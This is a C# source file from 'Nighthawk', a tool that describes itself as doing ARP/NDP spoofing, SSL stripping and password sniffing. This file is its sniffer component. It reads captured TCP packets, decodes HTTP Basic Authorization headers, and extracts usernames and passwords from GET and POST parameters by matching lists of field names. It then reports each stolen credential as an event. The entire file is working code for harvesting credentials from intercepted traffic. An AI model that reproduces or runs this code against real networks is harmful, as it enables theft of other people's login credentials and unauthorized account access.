using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Web;
using SharpPcap;
using PacketDotNet;
using System.Threading;

/**
Nighthawk - ARP/NDP spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2010  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    /* Basic password sniffer (currently only HTTP, HTML) */
    public class Sniffer
    {
        // current device
        private LivePcapDevice device;

        // status
        public bool Started = false;

        // exclusion
        private bool excludeLocalIP = false;
        private DeviceInfo deviceInfo;

        // packet queues (packet store for BG thread to work on)
        public List<TcpPacket> PacketQueue = new List<TcpPacket>();
        private List<TcpPacket> threadQueue = new List<TcpPacket>();

        // encoding converter
        private UTF8Encoding encoding = new UTF8Encoding();

        // worker thread
        private Thread worker;

        // events
        public event SnifferResultHandler SnifferResult;

        private void Result(string url, string username, string password, string aditional, SnifferResultType type)
        {
            // invoke event
            if (SnifferResult != null) SnifferResult(url, username, password, aditional, type);
        }

        // field names - username
        private string[] fieldNamesUser = new string[]
        {
            "user",
            "usr",
            "username",
            "name",
            "email",
            "mail",
            "account",
            "user-name",
            "log",
            "ime",
            "uporabni"
        };

        // field names - password
        private string[] fieldNamesPassword = new string[]
        {
            "pass",
            "password",
            "key",
            "pwd",
            "geslo"
        };

        // constructor
        public Sniffer(DeviceInfo deviceInfo)
        {
            // store our network interface
            device = deviceInfo.Device;
            this.deviceInfo = deviceInfo;
        }

        // start sniffer
        public void Start(bool excludeLocalIP)
        {
            // set
            this.excludeLocalIP = excludeLocalIP;

            // change status
            Started = true;

            // start a worker thread
            worker = new Thread(new ThreadStart(Worker));
            worker.Name = "Sniffer thread";
            worker.Start();
        }

        // stop sniffer
        public void Stop()
        {
            // change status
            Started = false;

            // stop worker thread
            worker.Abort();
        }
        
        // worker function that actually parses HTTP packets
        public void Worker()
        {
            // loop
            while (Started)
            {
                // copy packets to threadQueue
                lock (PacketQueue)
                {
                    foreach (TcpPacket packet in PacketQueue)
                    {
                        threadQueue.Add(packet);
                    }

                    PacketQueue.Clear();
                }

                if (threadQueue.Count > 0)
                {
                    // loop through packets
                    foreach (TcpPacket packet in threadQueue)
                    {
                        // check for exclusions
                        if (excludeLocalIP)
                        {
                            if ((packet.ParentPacket as IpPacket).SourceAddress.ToString() == deviceInfo.IP || (packet.ParentPacket as IpPacket).DestinationAddress.ToString() == deviceInfo.IP)
                            {
                                continue;
                            }
                        }

                        // parse HTTP packet
                        if (HttpPacket.IsHTTP(packet) || HttpPacket.HasPOST(packet))
                        {
                            var http = new HttpPacket(packet);

                            // check for any passwords
                            SnifferSearch(http);
                        }
                    }

                    threadQueue.Clear();
                }
                else
                {
                    // some timeout
                    Thread.Sleep(50);
                }
            }
        }

        // credentials search
        public void SnifferSearch(HttpPacket packet)
        {
            var user = string.Empty;
            var password = string.Empty;

            // check for 401 authentication
            if(packet.Header.Authorization != string.Empty)
            {
                try
                {
                    // clear out "BASIC"
                    var auth = packet.Header.Authorization.Replace("Basic ", "");

                    // convert from Base64
                    var bytes = Convert.FromBase64String(auth);
                    var credentials = encoding.GetString(bytes);

                    // split user:password
                    var userData = credentials.Split(':');

                    Result(packet.Header.Host, userData[0], userData[1], "", SnifferResultType.HTTPAuth);
                }
                catch { }
            }

            // if there are any GET params
            if (packet.Header.GetParams.Count > 0)
            {
                foreach (string[] param in packet.Header.GetParams)
                {
                    // check for field names - username
                    if (fieldNamesUser.Where(s => param[0].IndexOf(s) != -1).Count() > 0 && user == string.Empty)
                    {
                        user = param[1];
                    }
                    
                    // password
                    if (fieldNamesPassword.Where(s => param[0].IndexOf(s) != -1).Count() > 0 && password == string.Empty)
                    {
                        password = param[1];
                    }
                }

                // create output
                if (user != string.Empty && password != string.Empty)
                {
                    Result((packet.Header.Host != string.Empty ? packet.Header.Host : "/"), Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), "GET method", SnifferResultType.HTML);
                }
            }

            // reset values
            user = string.Empty;
            password = string.Empty;

            // if there are any POST params
            if (packet.PostParams.Count > 0)
            {
                foreach (string[] param in packet.PostParams)
                {
                    // check for field names - username
                    if (fieldNamesUser.Where(s => param[0].IndexOf(s) != -1).Count() > 0 && user == string.Empty)
                    {
                        user = param[1];
                    }
                    
                    // password
                    if (fieldNamesPassword.Where(s => param[0].IndexOf(s) != -1).Count() > 0 && password == string.Empty)
                    {
                        password = param[1];
                    }
                }

                // create output
                if (user != string.Empty && password != string.Empty)
                {
                    Result((packet.Header.Host != string.Empty ? packet.Header.Host : "/"), Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), "POST method", SnifferResultType.HTML);
               }
            }
        }
    }

    // sniffer result enum
    public enum SnifferResultType
    {
        HTTPAuth,
        HTML
    }

    // OnSnifferResult event delegate
    public delegate void SnifferResultHandler(string url, string username, string password, string aditional, SnifferResultType type);
}
